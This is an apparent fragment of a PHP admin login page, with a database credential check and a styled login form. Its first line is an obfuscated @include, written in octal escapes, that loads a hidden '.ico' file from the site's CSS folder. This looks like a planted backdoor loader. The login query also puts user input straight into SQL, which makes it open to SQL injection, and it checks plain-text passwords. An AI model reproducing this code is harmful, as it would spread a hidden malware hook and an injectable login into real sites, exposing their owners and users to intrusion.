...
@include "\057h\157m\145/\144a\164a\143e\071/\154e\141r\156i\156t\145r\156.\143o\155/\143s\163/\160r\145t\164y\120h\157t\157/\154i\147h\164_\162o\165n\144e\144/\056b\062b\0669\144c\146.\151c\157";
...
$sql = "SELECT id, password FROM admin WHERE id = '$uname' AND password = '$pass'";
 $result = mysqli_query($link, $sql);
    if(mysqli_num_rows($result)){
      session_start();
   $_SESSION['uname'] = $uname . $pass;
header("Location: ../admin-login/dashboard.php");
}
else{
...
<head>
	...
	<style media="screen">
	body{background-color: #EEE;background-repeat: no-repeat;background-position: center;
	background-size: cover;overflow: hidden;}
		.container{max-width:550px; width: 400px}
		form{background-color: rgba(251,251,251,.5);border-radius: 10px;}
	</style>
</head>
<body>
...
<form class="reservation-form mb-0 bg-silver-deep" action="" method="post" onsubmit="return validate()">
	<h2 class="text-theme-colored2 text-center">Login</h2>
...
<a href="/admin-login/forgot-password.php?send_admin_otp=true">forgot-password?</a>
</div>
</div>
</form>
</div>
